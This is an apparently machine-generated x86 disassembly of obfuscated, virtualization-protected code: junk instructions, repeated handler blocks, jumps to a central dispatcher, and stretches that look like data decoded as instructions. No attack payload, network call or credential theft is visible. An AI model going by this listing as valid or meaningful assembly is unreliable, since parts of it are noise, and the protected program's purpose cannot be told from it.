xchg [ eax - 0x7edd3653 ] ebx
mov eax 0x39afa11e
cmpsb [ esi ] [ edi ]
mov [ edi - 0x6ae3f42d ] gs
cmp eax 0xa464c162
rcr ebp cl
retn 0xd271
xchg esi eax
stc
mov edx 0xe9d6e304
xchg ecx eax
pop ebx
sub_1020bb91
push 0x5b40ca98
jmp rwxdata
pushad
mov [ esp + 0x1c ] 0xa7218b29
pushfd
lea esp [ esp + 0x20 ]
jmp rwxdata
call sub_1020e9c5
pushfd
mov [ esp ] eax
bt si di
rol si cl
xchg bp si
push ebx
movsx bx cl
bswap di
push 0xd9734d72
push [ rwxdata ]
pop [ esp ]
btr edi edi
xchg esi edi
stc
push 0x0
not bl
rcr si cl
rcr ebp 0x1
rcl bp 0xa
mov esi [ esp + 0x30 ]
mov di sp
call sub_1020dd7a
add al 0x22
and [ esi ] bl
add al 0x2
movsd [ edi ] [ esi ]
sbb eax 0x1b60a204
add al 0x2
jb rwxdata
cmp bl [ ebx ]
add al 0x62

add al 0xc2
push edx
sbb al [ edx + eax ]
jb rwxdata
add [ ebx ] ebx
add al 0xe2
push esp
sbb eax 0x1b98a204
add al 0xa2
add al 0x82
jno rwxdata
popad
sbb eax 0x1ba7e204
add al 0x62
sub bl [ esi ]
add al 0x62
xchg edi eax
sbb al [ edx + eax * 4 ]
pop ebp
sbb al [ edx ]
fstp [ esp + eax ]
retn 0x1da2
mov [ 0xffffffffa2041b98 ] al
add al 0xa2
in eax dx
sbb al 0x4
retn 0x1acd
sub_1020bc51
pushfd
lea esp [ esp + 0x28 ]
jl rwxdata
call sub_1011616c
jmp rwxdata
je rwxdata
call sub_10147230
stc
cmp cl ch
sub ecx ebx
jmp rwxdata
pushad
or bh al
setbe bl
mov bx [ esi ]
mov [ esp ] 0x42fc
and ebx 0xfff
pushad
cmp al ah
add [ ebx + edi ] ax
push 0xfbdac584
push [ esp ]
pushfd
pushfd
lea esp [ esp + 0x50 ]
jmp rwxdata
test cx 0xb4d0
jmp rwxdata
push 0xfd272457
lea esp [ esp + 0x4 ]
jne rwxdata
jmp rwxdata
pushad
cmp ebx 0x2
pushad
lea esp [ esp + 0x40 ]
je rwxdata
push edx
push edx
xchg ecx eax
jmp rwxdata
pushad
lea esp [ esp + 0x20 ]
call sub_1014c55d
pushfd
push 0x64680a47
lea esp [ esp + 0x8 ]
jmp rwxdata
add esi 0x2
jmp rwxdata
rol bx cl
mov bl 0xb6
test dh dh
btc bx dx
mov bx [ esi ]
clc
stc
jmp rwxdata
pushad
jmp rwxdata
jmp rwxdata
xchg ah bl
clc
sub bl 0xbd
mov eax ebp
pushfd
sbb bl bh
mov bl 0x1
sub esp 0xfffffffc
stc
call sub_101491f0
pushad
pushad
pushfd
dec ecx
push esi
lea esp [ esp + 0x48 ]
jne rwxdata
jmp rwxdata
cmp ebx 0x3
jmp rwxdata
pushfd
dec eax
pushfd
shl eax 0x8
not al
push 0x3695820c
pushfd
lodsb [ esi ]
push 0xe3e5c175
cmc
not al
cmc
sub al 0x59
push 0x5d658544
pushfd
neg al
pushad
bt sp 0x6
clc
mov [ esp + 0x4 ] 0x1335
sub al 0x9d
push 0x6a86e1a5
jmp rwxdata
btc bx 0x8
bswap bx
clc
jmp rwxdata
seto cl
bt bp 0x1
xor cl ah
mov ecx [ ebp - 0x4 ]
pushfd
bt bx 0xc
cmp [ ebp + 0x14 ] ecx
jmp sub_10115b2d
and ebx 0xfff
bt dx sp
jmp rwxdata
pushad
mov [ esp + 0x4 ] 0xfb
lea esp [ esp + 0x40 ]
je rwxdata
lea esp [ esp + 0x48 ]
call sub_1014c55d
push ecx
push 0x686be2cd
cmp eax 0x7d00
lea esp [ esp + 0x8 ]
jge rwxdata
mov bx [ esi ]
pushad
shr ebx 0xc
bt dx 0x6
bt dx cx
cmp ebx 0x1
call sub_1020bc51
movsb [ edi ] [ esi ]
cmp al 0xc2
ror [ esi ] 0x1
pushfd
bt bp sp
add [ ebx + edi ] dx
pushfd
pushad
lea esp [ esp + 0x28 ]
jmp rwxdata
pushfd
inc bl
sub bh al
mov bx [ esi ]
pushfd
cmp si dx
stc
and ebx 0xfff
call j_sub_102057d4
in eax 0x20
[ eax + 0x27 ]
push esp
dec ebx
pop esp
add bh [ edx + 0x1 ]
mov [ 0xffffffff83c45aa5 ] eax
cld
push ss
dec eax
add bl [ esi + edx * 4 + 0x1acd2a8 ]
add al 0xbf
and [ edi + 0x8 ] dl
mov dl [ edx + ecx * 2 + 0x54 ]
mov ax 0xa877
sti
pushad
pushad
push 0x11a5659c
lea esp [ esp + 0x44 ]
jmp rwxdata
pushad
pushfd
mov [ esp + 0x4 ] 0xe3
lea esp [ esp + 0x24 ]
jae rwxdata
jae rwxdata
pushad
inc ecx
lea esp [ esp + 0x20 ]
push 0xbfe735f8
inc ecx
add esp 0x4
rcl bl cl
cmc
xchg ebp eax
pushad
call j_sub_1011701f
stosb [ edi ]
enter 0x71ee 0x75
imul edi [ edx + 0x3a ] 0xda6e4938
add eax 0xd185ba99
lea edi [ ecx ]
lds ebp [ ecx - 0x44f02f8a ]
arpl [ eax ] di
inc edi
jmp rwxdata
clc
push 0x496c45e7
jmp sub_10117f5e
sti
inc esp
push ecx
insd
enter 0xa076 0xbe
push edx
insd
push ebp
dec edx
retn
sub_1020c376
call sub_10209cc9
int1
sub eax 0x69d51926
jpe rwxdata
xchg edx eax
mov dh 0x95
imul edx [ 0x590104a9 ] 0x25493545
cli
adc dh ch
clc
out 0x95 al
or dl [ edx + ecx - 0x51a57ae2 ]
cli
imul edx [ eax - 0x5407c8b2 ] 0x8bf6d3e7
push ebx
loopne rwxdata
mov ebx 0x92da8c8b
lodsd [ esi ]
pushad
sahf
daa
xchg edi eax
mov bl 0xac
xchg esp eax
jmp rwxdata
mov ah 0x56
mov [ 0x5a80d648 ] al
stosb [ edi ]
jo rwxdata
fsubr st0
push 0x519ea92d
lea ebp [ esp + edi * 2 - 0x20c0841d ]
jpe rwxdata
aaa
clc
stosd [ edi ]
out 0xd3 eax
test [ ebx - 0x4b9c1fad ] 0x56
cmc
and al 0xbb
int3
mov [ esp + 0x4 ] al
push ebx
lea esp [ esp + 0xc ]
call sub_101ffc63
call sub_1020a4fe
inc esp
lea esi [ edx + 0xe30be80 ]
imul esi [ ebp + eax * 8 - 0x4a37a44b ] 0xfffffffd
popfd
and [ edx + 0x7e ] esp
mov al [ 0xffffffffc55971ad ]
popad
fidivr [ ebp + 0x2 ]
or bh dl
pop esi
loopne rwxdata
0x32d3
inc esi
pop es
ja rwxdata
retn
push esp
pop eax
xchg eax ecx
jno rwxdata
mov eax [ 0xc8d8ab7 ]
test al 0x7b
cwde
push ds
dec esp
inc ebx
in al 0xfa
nop
or [ esi - 0x18188021 ] dh
push edi
push 0xc03ed576
and [ edi - 0x3f ] edx
cmp dl [ ecx ]
push edi
or [ ecx + ebp * 4 - 0x6a ] bl
jg rwxdata
sub dl ah
and eax ecx
xchg ecx eax
jl rwxdata
lodsb [ esi ]
mov bh 0x91
push ecx
lodsd [ esi ]
mov [ ebp + 0x2c15ed1 ] ebp
std
aas
jl rwxdata
sar [ ecx - 0x7ae5485a ] 0xc6
xor ch [ esp + ecx * 8 - 0x3cd64c19 ]
out dx al
xor [ esi ] edx
imul ecx edx 0xfd81be95
mov bl 0xfc
xor [ edi ] dl
add dl [ ebx + 0x3e1bb0c9 ]
lds ebx [ ecx ]
hlt
sub_1020c42d
lea esp [ esp + 0x28 ]
jae rwxdata
push esp
call sub_1011e5a4
jl rwxdata
pushad
mov bl 0x2
inc al
jmp rwxdata
sbb dl bl
mov eax 0xca55b202
mov edx 0x8510cf90
or ebp edx
jmp sub_10149924
mov dl 0x60
pushad
inc ecx
jmp sub_10149223
sub_1020c638
lea esp [ esp + 0x20 ]
ja rwxdata
jae rwxdata
jmp rwxdata
push 0xf5564d03
cmp ecx [ ebp - 0x4 ]
call sub_1014be53
call sub_10201415
push ecx
mov ah 0x6b
lahf
pop edi
xor [ edi - 0x138e0760 ] cl
dec eax
add [ ebx + 0xc ] dh
scasb [ edi ]
jo rwxdata
stc
cmp ecx [ ebp - 0x4 ]
push ebp
call sub_10204bf9
mov dh 0x97
enter 0xa41b 0x4d
mov eax 0x497d460c
fsubr [ eax + ebx * 8 + 0x67 ]
in al dx
push ebx
mov ebx 0xff7f6063
mov edi 0x9c42603f
stosd [ edi ]
aam 0x2c
0x26f9e894 0x86c1
call sub_10206e19
mov dh 0x9a
in al 0xab
adc al 0x1b
add al 0x73
0x6397b7d4 0xcf79
pop es
adc al 0xb5
enter 0xc01e 0xb7
scasd [ edi ]
mov eax 0x9e830ee4
xchg esp ecx
mov dh 0x98
pop edi
pop esi
enter 0xc63 0x54
das
cmpsb [ esi ] [ edi ]
sar [ ebx + 0x144e5b7 ] cl
aaa
inc edi
mov [ 0xffffffff85b3a7b5 ] al
0x606d
sbb bl [ ecx - 0x7b ]
aaa
dec esp
dec ebx
push esp
outsd
jo rwxdata
test al 0x22
cld
push ss
dec eax
xor cl [ esi + esi * 2 + 0x48 ]
xchg ebp eax
or [ edx + 0x2d ] esi
xchg edx eax
or eax 0x30affd22
test edx eax
jl rwxdata
cmp eax 0xb7c01ec8
test esp esi
push ecx
in eax dx
inc ecx
les ecx [ edi + 0x6b03823c ]
xor al 0x9b
stosd [ edi ]
jle rwxdata
mov ch 0x71
pop ebx
in eax dx
pop edi
xor [ ebx ] bl
jecxz rwxdata
fdiv st3
sub al 0x81

inc edi
pop eax
mov es cx
or dh [ esp + edx * 4 - 0x4aebf804 ]
jpo rwxdata
btc ebx ebx
pushfd
mov ebx eax
jmp rwxdata
xor ch dl
jle rwxdata
cmp [ ecx - 0x6b ] cl
scasb [ edi ]
popfd
out dx eax
push 0x37
xchg ecx eax
pushfd
mov edi 0x29ad9c83
push ds
ror [ 0x42f0b25e ] 0x1
push es
sub [ 0x59851302 ] edi
fisubr [ ecx - 0xd ]
add eax 0x44b5921b
0xc7029d85 0x4b73
clc
cmp al 0xaf
cmp [ edi ] 0x23
pushfd
lea esp [ esp + 0x8 ]
jne rwxdata
xchg edi eax
add [ ebx ] 0x2f
scasd [ edi ]
cmp al 0x8f

xchg ebx eax
loope rwxdata
push cs
mov dl 0x6c
mov ebx 0x39e45bec
loopne rwxdata
xchg ch al
shrd cx bp cl
ror al 0x1
mov ecx edi
rcr al cl
cmc
mov al [ ecx ]
cmp si 0x4446
pushfd
pushad
mov ah al
clc
cmp bl 0xed
sub al 0xc7
mov [ esp + 0x4 ] dh
cmc
jmp sub_101599d3
sar ax 0xd
bts ax 0x1
sub edx edx
movsx ax bl
daa
sbb ax dx
aas
mov eax edx
dec al
test bl 0xe2
or al cl
add edi 0x1
and al 0x5f
adc al 0xd7
mov al [ edi ]
cmp eax edx
test al al
jmp rwxdata
les edi [ edx - 0x5f50611f ]
mov dl 0x1e
fiadd [ ecx + 0x22ea95aa ]
xchg dl ch
xchg esp eax
jmp 0xffffffff9c0c8ab9
inc [ edi - 0x68 ]
sbb eax esp
mov edx 0xcc1e7f74
jg rwxdata
inc edi
cwde
je rwxdata
retn 0xc391
sti
dec eax
xchg ebp eax
mov edx 0x838ad5a5
jpo rwxdata
btc edi 0xc
not al
xor cl al
mov edi edx
stc
jmp rwxdata
clc
stc
sub al 0x30
call sub_1014781a
sub_1020c757
cmp ecx 0xffff
push ebx
jmp rwxdata
mov [ esp ] esp
lea esp [ esp + 0x10 ]
jbe rwxdata
cmc
sub ecx [ edx + 0x10 ]
test sp bp
stc
cmp ecx [ edx + 0x14 ]
je rwxdata
bsf bx ax
bswap di
xor di 0xadeb
mov edi [ edx + 0x24 ]
pushfd
btc bx bx
sub ch 0xb7
adc bl dl
add edi eax
bts cx dx
push [ esp ]
mov ebx [ edx + 0x20 ]
lea ecx [ ecx + 0x2f96df97 ]
rcr ch 0x1
btc cx 0x2
add ebx eax
jmp rwxdata
pushfd
call sub_101164b1
bt di 0x9
pushad
pushfd
pushad
add ecx 0xffffffff
push 0xb06ce317
jmp sub_10208dbc
pushad
push [ esp ]
lea esp [ esp + 0x24 ]
jae rwxdata
add esp 0x8
jo rwxdata
movsx dx al
je rwxdata
pushfd
mov [ esp ] 0xa2
push [ esp ]
lea esp [ esp + 0x8 ]
jmp rwxdata
and ecx esp
test si 0xafad
mov [ ebp - 0x8 ] 0x0
sar cx 0x5
mov ecx [ edx + 0x18 ]
bt edx 0x15
bt esp 0xa
call sub_101ff898
setg ch
bt sp 0x1
mov [ ebp - 0x8 ] 0x0
rol cx cl
call sub_101571c3
pop ss
bswap edi
comiss xmm4 [ edi ]
aaa
inc ebx
cmp ecx [ esi ]
call sub_1014ac34
fcom [ eax + 0xe ]
adc eax 0x7b6a554a
shr [ ebp - 0x20e6b7b7 ] cl
imul edx [ esi + 0x4e78a788 ] 0x886975b0
jge rwxdata
rcl bl cl
adc di 0x7eed
xor eax eax
bswap edx
mov bl 0x5d
xchg si bx
pop edx
call sub_102031b5
add [ eax ] al
inc ebx
outsd
inc ebx
jb rwxdata
jmp rwxdata
mov [ ebp - 0x3 ] bh
cmp [ esi ] 0x706dd161
popad
pop esi
adc ebp [ ebx ]
xlat
xchg [ ebx - 0x74 ] edx
popfd
out dx eax
pop edi
sub esi edx
popad
je rwxdata
shld di dx cl
dec di
mov edi [ edx + 0x1c ]
stc
pushfd
pushfd
push ebp
add edi eax
bt sp 0x8
mov edi [ edi + ecx * 4 ]
test cx ax
test edi edi
push [ esp + 0x4 ]
pushfd
call sub_10147cf1
xchg esi eax
dec eax
pshufw mm6 [ ebx + 0x120dbdac ] 0x68
mov bh 0x28
cmp ecx [ 0x10ee1c82 ]
mov dl 0xc
sti
in al 0x96
call 0x4bc7564
out dx eax
sar [ edi ] 0x1
add [ edx ] dh
or al 0xd7
call 0x7e82a5e0
jg rwxdata
pop es
div [ edi + 0x8 ]
cdq
add eax 0xe13e1ec1
imul esi esi 0x716726f9
pop ebx
dec eax
pop ecx
jmp rwxdata
dec ecx
outsb
jae rwxdata
in al 0xe7
pushad
or [ ebx + 0x2c17ce7a ] 0xffffffab
adc al 0x4c
std
aad 0x0
inc ebp
xor [ ebp + 0x4a ] 0x46d119fa
out dx eax
push ebp
0x33ac1aa5 0xe244
dec edx
pop ebx
0x97843bb1 0xf378
adc ebx [ ecx - 0x196e3144 ]
scasd [ edi ]
adc [ ebx ] ch
sbb al 0x2c
pop ebp
test [ eax ] 0x19
imul [ eax ]
cmp [ ebx + 0x2b ] edx
les edi [ ss : eax - 0x35 ]
into
push esp
adc ebp [ ebx ]
add ecx [ 0x51f87635 ]
stosb [ edi ]
jns rwxdata
cmp [ edx + ecx * 4 + 0xb96555 ] 0x7e
nop
mov ss [ ebp + 0x6a ]
out dx eax
outsd
xor [ esi + 0x49 ] 0x5a
add [ edi - 0x555d10a8 ] bl
adc dh cl
pop edi
fwait
jae rwxdata
scasd [ edi ]
popad
outsb
arpl [ ebp ] sp
mov [ esp + 0x28 ] 0xa401f29b
pushfd
mov [ esp ] 0xae
push eax
mov [ esp + 0x4 ] 0x311ec6de
lea esp [ esp + 0x30 ]
jmp sub_1020d404
stc
movsb [ edi ] [ esi ]
stosd [ edi ]
js rwxdata
mov dh dh
pop es
inc eax
in eax dx
rol [ ebp - 0x7a ] 0xa3
mov esp 0x3de30d00
or eax [ ebx ]
pushfd
dec edi
ror dh 0x1
ror bl 0x1
mov ah 0xe7
cwde
jb rwxdata
pop ds
fld [ 0x7c3107b7 ]
jo rwxdata
xor cl ch
pop ss
dec ebp
or al 0x0
xchg ebp eax
dec edi
iretd
add dh bh
aas
pop ebp
xchg edx ebx
idiv cl
jno rwxdata
mov ecx esp
cmp al 0xc9
push esi
fisttp [ edi ]
xlat
sbb [ edx ] bl
das
push edi
xchg [ eax - 0x7edd3653 ] ebx
mov eax 0x39afa11e
cmpsb [ esi ] [ edi ]
mov [ edi - 0x6ae3f42d ] gs
cmp eax 0xa464c162
rcr ebp cl
retn 0xd271
xchg esi eax
stc
mov edx 0xe9d6e304
xchg ecx eax
pop ebx
sub_1020d263
and al dl
mov [ esp + 0x4 ] 0xe49
pushfd
mov [ ebp + 0x4 ] ax
jmp rwxdata
jmp rwxdata
pushad
mov [ esp + 0x8 ] 0xc3
pushfd
pop [ esp + 0x34 ]
call sub_1020d8a7
pushad
mov ebp [ ebp ]
mov [ esp + 0x4 ] 0x26
lea esp [ esp + 0x20 ]
jmp sub_1020f090
sub_1020d2c8
push [ esp + 0x4 ]
pushfd
push [ esp + 0x38 ]
pop [ ebp ]
push edi
push eax
push 0xdaa0f5c7
lea esp [ esp + 0x48 ]
jmp rwxdata
shrd dx bx 0xd
cmp dl dl
bswap dx
shl al 0x1
mov al [ esi - 0x1 ]
pushad
shrd dx sp cl
sub al bl
bswap edx
not al
adc dx bx
ror edx cl
shl dx cl
bts dx 0x2
neg al
push [ esp ]
cmp ch 0x77
shrd dx bp 0xd
xor al 0x7f
call sub_1020ddbf
adc dx 0x272e
mov edx [ ebp ]
call sub_1020e684
lahf
shrd ax bx 0x3
shld ax si cl
mov ax ss
cmp di 0x7cc7
sub ebp 0x2
push ebp
pushad
pushad
call sub_1020e464
mov [ ebp + 0x8 ] ebx
push 0x21e6a4fb
mov [ ebp + 0x4 ] ecx
jmp rwxdata
call sub_1020e95a
push 0x313dd166
test bl 0x1d
sub ebp 0x4
stc
mul edx
call sub_1020e3f4
bswap dx
cmc
bt cx bx
popfd
pushfd
pop edx
jmp rwxdata
pop edx
pushfd
push [ esp + 0x4 ]
retn 0x8
sub_1020d32f
lea edx [ eax - 0x778e0c21 ]
movzx dx al
bswap dx
push ebp
pushfd
pop [ esp ]
bts dx dx
push ebp
rcr dh cl
call sub_1020e9b5
cmc
mov ax [ ebp ]
cmp cl 0xd
xor cl bh
pushad
mov cl [ ebp + 0x2 ]
bt edi esp
cmp ch dh
pushad
sub ebp 0x2
pushfd
mov [ esp ] al
shr ax cl
jmp rwxdata
jmp rwxdata
mov [ esp + 0x4 ] bx
push [ esp ]
mov [ ebp + 0x4 ] ax
push ebx
push [ esp + 0x4 ]
pushfd
pop [ esp + 0x4c ]
push 0xd4ded92a
call sub_1020da9b
xor eax 0xde259fb
clc
add ebx eax
clc
cmp ah 0x92
mov [ esp ] dl
sub ebp 0x4
push 0xdc85d3c2
mov [ ebp ] eax
mov [ esp + 0x4 ] cl
lea esp [ esp + 0x8 ]
jmp sub_1020f090
sub_1020d397
mov [ esp ] si
pushfd
pop [ esp + 0x1c ]
mov [ esp + 0x8 ] sp
push [ esp + 0x1c ]
pop [ ebp ]
push [ esp + 0x4 ]
pushfd
mov [ esp ] dh
lea esp [ esp + 0x28 ]
jmp rwxdata
shrd dx bx 0xd
cmp dl dl
bswap dx
shl al 0x1
mov al [ esi - 0x1 ]
pushad
shrd dx sp cl
sub al bl
bswap edx
not al
adc dx bx
ror edx cl
shl dx cl
bts dx 0x2
neg al
push [ esp ]
cmp ch 0x77
shrd dx bp 0xd
xor al 0x7f
call sub_1020ddbf
adc dx 0x272e
mov edx [ ebp ]
call sub_1020e684
lahf
shrd ax bx 0x3
shld ax si cl
mov ax ss
cmp di 0x7cc7
sub ebp 0x2
push ebp
pushad
pushad
call sub_1020e464
mov [ ebp + 0x8 ] ebx
push 0x21e6a4fb
mov [ ebp + 0x4 ] ecx
jmp rwxdata
call sub_1020e95a
push 0x313dd166
test bl 0x1d
sub ebp 0x4
stc
mul edx
call sub_1020e3f4
bswap dx
cmc
bt cx bx
popfd
pushfd
pop edx
jmp rwxdata
pop edx
pushfd
push [ esp + 0x4 ]
retn 0x8
sub_1020d591
pushfd
lea esp [ esp + 0x3c ]
jne rwxdata
or cx sp
mov ecx eax
call sub_1020d6e1
mov [ esp + 0x8 ] 0xb8
mov [ ebp ] ax
mov [ esp ] 0x2aae
mov [ esp + 0x4 ] 0x3ff0c1f2
push [ esp ]
push [ esp ]
lea esp [ esp + 0x18 ]
jmp sub_1020f090
pushad
call sub_1020d717
movsx ax cl
shrd ax dx 0x8
pushad
or al bl
mov eax [ ebp ]
sar cl 0x5
test esp 0xfc543bee
inc cl
mov cl [ ebp + 0x4 ]
bt ecx edi
mov [ esp ] ax
sub ebp 0x2
cmc
pushfd
call sub_1020da1d
shl dl 0x3
setb al
jmp rwxdata
movzx eax [ esi - 0x1 ]
btr dx bx
not dh
not dl
call sub_1020f0e7
pushfd
pushad
call sub_1020e82b
call sub_1020db7a
cmp dh 0xf8
add bl al
cmc
call sub_1020e923
pushfd
not al
bt si cx
add bl al
test cl dh
clc
push ebp
test al cl
sub ebp 0x2
jmp rwxdata
jmp rwxdata
mov [ ebp ] ax
push edx
pushfd
pushfd
lea esp [ esp + 0x40 ]
jmp sub_1020f090
sub_1020d641
pushad
lea esp [ esp + 0x44 ]
cpuid
pushfd
sub ebp 0xc
pushad
cmp [ ebp + 0xc ] 0x1
mov [ esp ] 0xb4
pushfd
call sub_1020d685
jmp rwxdata
cmc
neg al
mov al [ esi - 0x1 ]
stc
clc
add esi 0xffffffff
pushad
add al bl
jmp rwxdata
jmp rwxdata
inc al
stc
clc
call sub_1020e952
mov [ ebp ] ax
push edx
pushfd
pushfd
lea esp [ esp + 0x40 ]
jmp sub_1020f090
sub_1020d685
mov [ ebp + 0xc ] eax
push [ esp ]
jmp rwxdata
jmp rwxdata
mov [ ebp + 0x8 ] ebx
push 0x21e6a4fb
mov [ ebp + 0x4 ] ecx
jmp rwxdata
call sub_1020e95a
push 0x313dd166
test bl 0x1d
sub ebp 0x4
stc
mul edx
call sub_1020e3f4
bswap dx
cmc
bt cx bx
popfd
pushfd
pop edx
jmp rwxdata
pop edx
pushfd
push [ esp + 0x4 ]
retn 0x8
sub_1020d690
lea esp [ esp + 0x28 ]
jne rwxdata
not bh
movzx bx bl
call sub_1020d705
push 0x76e978f6
sub esp 0xffffffdc
jne rwxdata
bswap bx
ror bl cl
xor [ ebp + 0xc ] 0x20
movsx bx al
movsx bx dl
pop ebx
push 0xf593dac4
push edx
push 0x8241305a
lea esp [ esp + 0xc ]
jmp sub_1020f090
push 0xac4ba1f6
bswap eax
clc
add eax ebx
cmp bx bx
add eax 0xb2b3f12
cmc
bt sp ax
sub esi 0x4
stc
ror eax 0x1d
jmp rwxdata
bswap eax
cmp esp 0x7c3a5ea0
clc
cmp esi ecx
pushfd
add eax ebx
cmc
cmp ecx 0x33d02062
cmp sp 0xe560
push edi
add eax 0xb2b3f12
cmp bx 0x3eae
sub esi 0x4
call sub_1020ec86
call sub_1020e9c5
pushfd
mov [ esp ] eax
bt si di
rol si cl
xchg bp si
push ebx
movsx bx cl
bswap di
push 0xd9734d72
push [ rwxdata ]
pop [ esp ]
btr edi edi
xchg esi edi
stc
push 0x0
not bl
rcr si cl
rcr ebp 0x1
rcl bp 0xa
mov esi [ esp + 0x30 ]
mov di sp
call sub_1020dd7a
add al 0x22
and [ esi ] bl
add al 0x2
movsd [ edi ] [ esi ]
sbb eax 0x1b60a204
add al 0x2
jb rwxdata
xor eax 0xde259fb
clc
add ebx eax
clc
cmp ah 0x92
mov [ esp ] dl
sub ebp 0x4
push 0xdc85d3c2
mov [ ebp ] eax
mov [ esp + 0x4 ] cl
lea esp [ esp + 0x8 ]
jmp sub_1020f090
cmp bl [ ebx ]
add al 0x62

add al 0xc2
push edx
sbb al [ edx + eax ]
jb rwxdata
add [ ebx ] ebx
add al 0xe2
push esp
sbb eax 0x1b98a204
add al 0xa2
add al 0x82
jno rwxdata
popad
sbb eax 0x1ba7e204
add al 0x62
sub bl [ esi ]
add al 0x62
xchg edi eax
sbb al [ edx + eax * 4 ]
pop ebp
sbb al [ edx ]
fstp [ esp + eax ]
retn 0x1da2
mov [ 0xffffffffa2041b98 ] al
add al 0xa2
in eax dx
sbb al 0x4
retn 0x1acd
sub_1020d6e1
test dl 0x99
shl eax 0x7
cmp ah bl
cmp ah bh
bt dx di
shr ecx 0x19
bt bp bp
clc
bt di 0x1
cmc
or eax ecx
cmc
jmp sub_1020f02e
sub_1020d717
mov [ ebp ] eax
mov [ esp ] 0x7f88
mov [ esp + 0x4 ] ah
pushfd
lea esp [ esp + 0x28 ]
jmp rwxdata
shrd dx bx 0xd
cmp dl dl
bswap dx
shl al 0x1
mov al [ esi - 0x1 ]
pushad
shrd dx sp cl
sub al bl
bswap edx
not al
adc dx bx
ror edx cl
shl dx cl
bts dx 0x2
neg al
push [ esp ]
cmp ch 0x77
shrd dx bp 0xd
xor al 0x7f
call sub_1020ddbf
adc dx 0x272e
mov edx [ ebp ]
call sub_1020e684
lahf
shrd ax bx 0x3
shld ax si cl
mov ax ss
cmp di 0x7cc7
sub ebp 0x2
push ebp
pushad
pushad
call sub_1020e464
mov [ ebp + 0x8 ] ebx
push 0x21e6a4fb
mov [ ebp + 0x4 ] ecx
jmp rwxdata
call sub_1020e95a
push 0x313dd166
test bl 0x1d
sub ebp 0x4
stc
mul edx
call sub_1020e3f4
bswap dx
cmc
bt cx bx
popfd
pushfd
pop edx
jmp rwxdata
pop edx
pushfd
push [ esp + 0x4 ]
retn 0x8
sub_1020d787
stc
cmp cl 0xd0
mov [ esp + 0x4 ] bh
add ebx eax
clc
call sub_1020e9a8
neg al
inc dl
mov [ esp ] 0x28
not dx
push edi
dec al
shl dl 0x3
add bl al
bswap dx
call sub_1020f013
jmp rwxdata
stc
add ebp 0x2
bt sp 0xd
shrd eax edx cl
push 0xf51dd510
call sub_1020e516
bt di cx
push edx
mov al [ eax + edi ]
stc
cmc
cmc
mov [ esp ] ax
sub ebp 0x2
pushfd
push [ esp ]
push [ esp ]
call sub_1020ef6e
inc al
stc
clc
call sub_1020e952
mov [ ebp ] ax
push edx
pushfd
pushfd
lea esp [ esp + 0x40 ]
jmp sub_1020f090
sub_1020d8a7
call sub_1020d3bd
call sub_1020e7cb
rol al 0x7
neg al
mov edx [ ebp ]
shl al 0x7
inc al
stc
pushfd
add ebp 0x2
call sub_1020d929
jmp rwxdata
push [ esp + 0x8 ]
pop [ ebp ]
mov [ esp ] dh
mov [ esp ] eax
lea esp [ esp + 0xc ]
jmp sub_1020f090
sub_1020d91d
mov [ ebp + 0x4 ] edx
push [ esp ]
pushad
jmp rwxdata
push [ esp ]
mov [ ebp + 0x8 ] eax
pushfd
pushfd
pushfd
pop [ esp + 0x38 ]
push ecx
push 0xc3bf0e99
pushfd
push [ esp + 0x44 ]
pop [ ebp ]
push 0x2c9e4a86
lea esp [ esp + 0x4c ]
jmp sub_1020f090
sub_1020d929
mov al [ ss : edx ]
push [ esp + 0x4 ]
push 0xee791906
pushad
mov [ ebp ] ax
push [ esp + 0x4 ]
pushfd
mov [ esp + 0x4 ] 0xe7
lea esp [ esp + 0x38 ]
jmp rwxdata
shrd dx bx 0xd
cmp dl dl
bswap dx
shl al 0x1
mov al [ esi - 0x1 ]
pushad
shrd dx sp cl
sub al bl
bswap edx
not al
adc dx bx
ror edx cl
shl dx cl
bts dx 0x2
neg al
push [ esp ]
cmp ch 0x77
shrd dx bp 0xd
xor al 0x7f
call sub_1020ddbf
adc dx 0x272e
mov edx [ ebp ]
call sub_1020e684
lahf
shrd ax bx 0x3
shld ax si cl
mov ax ss
cmp di 0x7cc7
sub ebp 0x2
push ebp
pushad
pushad
call sub_1020e464
mov [ ebp + 0x8 ] ebx
push 0x21e6a4fb
mov [ ebp + 0x4 ] ecx
jmp rwxdata
call sub_1020e95a
push 0x313dd166
test bl 0x1d
sub ebp 0x4
stc
mul edx
call sub_1020e3f4
bswap dx
cmc
bt cx bx
popfd
pushfd
pop edx
jmp rwxdata
pop edx
pushfd
push [ esp + 0x4 ]
retn 0x8
sub_1020da24
pushfd
lea esp [ esp + 0x8 ]
jpo rwxdata
call sub_1020eeb6
pushfd
mov [ ebp ] ax
push 0x9aa3ad73
lea esp [ esp + 0x3c ]
jmp sub_1020f090
push edx
pushad
push [ esp + 0x4 ]
push edx
lea esp [ esp + 0x28 ]
jmp sub_1020d32f
sub_1020da9b
lea esp [ esp + 0x54 ]
jg rwxdata
pushad
pushad
push [ esp + 0x40 ]
pop [ ebp ]
mov [ esp + 0x4 ] ah
lea esp [ esp + 0x44 ]
jmp sub_1020f090
push 0x6a190e72
push [ esp + 0x4 ]
pop [ ebp ]
pushad
lea esp [ esp + 0x28 ]
jmp sub_1020f090
sub_1020db7f
rol dh cl
movzx eax al
setle dh
btr dx 0x1
mov edx [ eax * 4 + rwxdata ]
push 0x652cd922
cmc
rol edx 0x13
cmp dl 0x3e
sub esp 0xfffffff8
jg rwxdata
pushfd
push 0x35031213
add edx 0x0
mov [ esp + 0x4 ] ah
call j_sub_1020daef
push 0x71caeb6e
add edx 0x0
jmp sub_1020d49b
sub_1020dcbd
mov [ ebp + 0x4 ] eax
call sub_1020edb5
adc ah 0x37
mov ax [ ebp ]
bt bp 0xa
push 0x3a37beed
bt cx di
sub ebp 0x2
clc
pushfd
add [ ebp + 0x4 ] ax
mov [ esp ] 0x8a01dfdc
call sub_1020d952
mov ax [ ebp + 0x2 ]
call sub_1020e4c4
sub_1020dcf8
lea esp [ esp + 0x40 ]
jne rwxdata
not bh
movzx bx bl
call sub_1020d705
push 0x76e978f6
sub esp 0xffffffdc
jne rwxdata
movsx bx al
clc
mov ebx eax
call sub_1020e56e
dec al
cmc
pushfd
stc
add bl al
pushfd
add esp 0x38
jne rwxdata
push 0xac4ba1f6
bswap eax
clc
add eax ebx
cmp bx bx
add eax 0xb2b3f12
cmc
bt sp ax
sub esi 0x4
stc
ror eax 0x1d
jmp rwxdata
bswap eax
cmp esp 0x7c3a5ea0
clc
cmp esi ecx
pushfd
add eax ebx
cmc
cmp ecx 0x33d02062
cmp sp 0xe560
push edi
add eax 0xb2b3f12
cmp bx 0x3eae
sub esi 0x4
call sub_1020ec86
